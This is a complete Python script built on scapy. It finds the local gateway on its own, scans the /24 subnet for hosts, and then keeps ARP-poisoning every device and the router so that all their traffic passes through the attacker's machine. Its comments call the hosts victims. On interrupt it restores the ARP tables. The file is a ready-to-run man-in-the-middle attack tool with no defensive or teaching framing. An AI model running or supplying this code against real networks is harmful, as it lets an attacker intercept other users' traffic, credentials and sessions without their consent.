from scapy.all import ARP, Ether, srp, send
import time
import sys
import os

from autodetect_network import get_gateway_ip, get_network_interface

gateway_ip = get_gateway_ip()  # Auto-detected router IP
interface = get_network_interface()  # Auto-detected network interface

def get_mac(ip):
    """Get MAC address for an IP on the network."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered_list = srp(broadcast / arp_request, timeout=2, iface=interface, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def scan_network(prefix):
    """Scan the network for active devices."""
    print(f"[*] Scanning {prefix}.0/24 network...")
    arp_request = ARP(pdst=prefix + ".0/24")
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered = srp(broadcast / arp_request, timeout=2, iface=interface, verbose=False)[0]
    
    targets = []
    for sent, received in answered:
        if received.psrc != gateway_ip:
            targets.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    if targets:
        print(f"[+] Found {len(targets)} devices:")
        for target in targets:
            print(f"    IP: {target['ip']} | MAC: {target['mac']}")
    else:
        print("[!] No devices found.")

    return targets

def spoof(target_ip, target_mac, spoof_ip):
    """Send spoofed ARP reply."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, iface=interface, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    """Restore normal ARP tables."""
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, iface=interface, verbose=False)

def start_spoofing_all(devices):
    """Start ARP spoofing for all devices in the network."""
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("[!] Could not find gateway MAC address. Exiting...")
        return

    print("[*] Starting ARP poisoning... (Press CTRL+C to stop)")
    try:
        while True:
            for device in devices:
                spoof(device['ip'], device['mac'], gateway_ip)      # Tell victim that attacker is gateway
                spoof(gateway_ip, gateway_mac, device['ip'])         # Tell gateway that attacker is victim
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C! Restoring network...")
        for device in devices:
            restore(device['ip'], device['mac'], gateway_ip, gateway_mac)
            restore(gateway_ip, gateway_mac, device['ip'], device['mac'])
        print("[+] Network restored.")

def main():
    prefix = gateway_ip.rsplit('.', 1)[0]
    devices = scan_network(prefix)
    
    if devices:
        start_spoofing_all(devices)
    else:
        print("[!] No devices found. Exiting...")

if __name__ == "__main__":
    main()
